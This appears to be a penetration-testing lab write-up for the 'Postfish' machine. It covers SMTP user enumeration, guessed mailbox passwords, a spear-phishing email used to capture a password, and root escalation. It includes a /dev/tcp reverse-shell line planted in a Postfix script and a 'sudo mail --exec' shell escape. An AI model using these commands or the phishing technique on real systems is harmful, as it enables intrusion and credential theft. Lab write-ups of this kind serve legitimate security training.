---
Alias: Postfish
Date: 6/7/2022
Platform: Linux
Difficulty: Intermediate
Tags:
Status: Finished
IP: 192.168.108.137
---

# {{{{Postfish}}}}


# Resolution summary
- Utilized smtp-user-enum to enumerate the users on system as I found port 25 to be opened
- Found multiple accounts exist
- Found user sales exists in the POP3 mailbox
- Guessed passwords and found I was able to login with password sales
- Attempted to navigate to webpage on open port 80
- Was redirected to postfish.off but was unable to access the page
- Added target IP address and linked to postfish.off to the host file on kali machine
- Navigated to postfish.off and found webpage showing team member information and found Brian Moore being the Sales Manager
- Googled port 25 commands and found how to curate an email
- Setup a netcat listener on Kali machine
- Sent a spear fishing email to change/update password to Brian from IT including a link to connect to kali machine
- Awaited Brian to connect to the link and send back new password
- Received the password shown in the netcat listener
- Then logged into SSH using the credentials
- Typed "sudo -l" and found user filter can run "/usr/bin/mail *" as sudo
- Tound /usr/bin/mail in GTFOBINS and followed the steps and received a shell running as root

## Improved skills
- password guessing
- learned how to send an email via port 25 smtp

## Used tools
- nmap
- smtp-user-enum

---

# Information Gathering
Scanned all TCP ports:
```bash
Nmap 7.92 scan initiated Thu Apr  7 19:42:01 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/brian/Downloads/EZEA/results/192.168.108.137/autorecon/192.168.108.137/scans/_quick_tcp_nmap.txt -oX /home/brian/Downloads/EZEA/results/192.168.108.137/autorecon/192.168.108.137/scans/xml/_quick_tcp_nmap.xml 192.168.108.137
adjust_timeouts2: packet supposedly had rtt of -159693 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -159693 microseconds.  Ignoring time.
Nmap scan report for 192.168.108.137
Host is up, received user-set (0.12s latency).
Scanned at 2022-04-07 19:42:17 PDT for 69s
Not shown: 993 closed tcp ports (reset)
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6RTbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQiZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML
25/tcp  open  smtp     syn-ack ttl 63 Postfix smtpd
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
| SHA-1: 63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
110/tcp open  pop3     syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE STLS UIDL CAPA TOP USER SASL(PLAIN) RESP-CODES PIPELINING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
| SHA-1: 63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
143/tcp open  imap     syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: OK more have listed post-login IDLE SASL-IR ID STARTTLS Pre-login AUTH=PLAINA0001 LOGIN-REFERRALS capabilities IMAP4rev1 ENABLE LITERAL+
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
| SHA-1: 63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap syn-ack ttl 63 Dovecot imapd (Ubuntu)
|_imap-capabilities: OK have more post-login IDLE SASL-IR ID listed Pre-login AUTH=PLAINA0001 LOGIN-REFERRALS capabilities IMAP4rev1 ENABLE LITERAL+
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
| SHA-1: 63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 syn-ack ttl 63 Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) CAPA AUTH-RESP-CODE TOP USER UIDL RESP-CODES PIPELINING
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376 0d7f 8cb1 2db9 fedd 1809 463e 94c2
| SHA-1: 63ab a073 44fd 01a2 489f c9a0 8f50 de80 f33c 6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Aggressive OS guesses: Linux 2.6.32 (91%), Linux 2.6.32 or 3.10 (91%), Linux 2.6.39 (91%), Linux 3.10 - 3.12 (91%), Linux 3.4 (91%), Linux 3.5 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Synology DiskStation Manager 5.1 (91%), WatchGuard Fireware 11.8 (91%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=4/7%OT=22%CT=1%CU=44356%PV=Y%DS=2%DC=T%G=Y%TM=624FA14E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%TS=A)OPS(O1=M54EST1
OS:1NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54
OS:EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T
OS:G=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(
OS:R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%TG=40%CD=S)IE(R=Y%DFI=N%T=40%CD=S)
 
Uptime guess: 19.462 days (since Sat Mar 19 08:37:41 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   106.38 ms 192.168.49.1
2   106.35 ms 192.168.108.137
 
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr  7 19:43:26 2022 -- 1 IP address (1 host up) scanned in 87.86 seconds
```

Enumerated open TCP ports:
```bash
25
80
110
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 25 - Postfix smtpd

#### Per the nmap scan, port 25 was open so I used smtp user enum script and typed "sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t 192.168.108.137" and found the following valid users for SMTP:

![](Pasted%20image%2020221025153641.png)

#### -Typed "telnet 192.168.108.137 110" to enter POP3 mailbox in open 110 port and went one by one with attempting to login with each found user providing their usernames as passwords and found I could login with USER sales and PASS sales and found the following e-mail:
![](Pasted%20image%2020221025170417.png)
![](Pasted%20image%2020221025170504.png)

## Port 80 - Apache httpd 2.4.41

#### -Navigated to website as port 80 was found to be open per NMAP scan but was redirected to "postfish.off" and was unable to access it. 

#### -Typed "vim /etc/hosts" and added target ip address linking to postfish.off

#### -Then navigated to postfish.off and found the following webpage:

![](Pasted%20image%2020221025170559.png)

#### -I then clicked on the "Our Team" link and found Brian Moore being the "Sales Manager":

![](Pasted%20image%2020221025170647.png)



---

# Exploitation
## Name of the technique

#### -I then googled port 25 command (SMTP) and found the following link/webage showing how I can send an e-mail via port 25 to their internal sales team. Per previous e-mail found sent from it@postfish.off:

![](Pasted%20image%2020221025172936.png)

![](Pasted%20image%2020221025173043.png)

![](Pasted%20image%2020221025173137.png)

![](Pasted%20image%2020221025173207.png)
#SMTPSpearfishingExploit

#### -I then typed the following sending a spear phishing e-mail from it@postfish.off to brian.moore@postfish.off while having a netcat listener listening on port 80:

![](Pasted%20image%2020221025173328.png)

![](Pasted%20image%2020221025173415.png)

#### -Then received application web page form showing brian's password as "EternaLSunshinE":

![](Pasted%20image%2020221025173459.png)

#### -I then typed "ssh brian.moore@postfish.off" and password and received an ssh shell for user brian moore:

![](Pasted%20image%2020221025173541.png)

![](Pasted%20image%2020221025173624.png)

---
# Lateral Movement to user
## Local Enumeration

#### -Ran linpeas and found user brian moore is a member of group filter and "/etc/postfix/disclaimer" is writable by filter

#### -Googled "/etc/postfix/disclaimer privilege escalation" and found the following webpage showing the following steps to escalate priviliges:

![](Pasted%20image%2020221025173854.png)

![](Pasted%20image%2020221025173931.png)

![](Pasted%20image%2020221025174013.png)

![](Pasted%20image%2020221025174049.png)
#PostFixDisclaimerPrivilegeEscalation


## Lateral Movement vector
### Postfix Disclaimer

#### -Typed "vim /etc/postfix/disclaimer" and added "bash -c "0<&196;exec 196<>/dev/tcp/[kali IP]/80; sh <&196 >&196 2>&196" after the following:

#!/bin/bash
# Localize these.
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

![](Pasted%20image%2020221025175933.png)

#### -Typed vim "sendemail.py" and added the following script to send an email:

import smtplib

server = smtplib.SMTP("localhost",25)

server.ehlo()

server.sendmail("a@b.c","a@b.c","Hello")

server.quit()

#### -Started a netcat listener on my kali machine listening on port 80

#### -Typed "python3 sendemail.py" and received a shell as user filter:

![](Pasted%20image%2020221025180235.png)

---

# Privilege Escalation
## Local Enumeration

#### -Typed "sudo -l" and found user filter can run "/usr/bin/mail *" as sudo:
![](Pasted%20image%2020221025180351.png)

## Privilege Escalation vector
## /usr/bin/mail GTFOBINS 

#### -Found mail with sudo privileges in GTFOBins site:

![](Pasted%20image%2020221025180737.png)
![](Pasted%20image%2020221025180808.png)
#/usr/bin/mailGTFOBINSPrivilegeEscalation

#### -Typed "sudo mail --exec='!/bin/sh'" and received a shell as root:

![](Pasted%20image%2020221025180855.png)

---
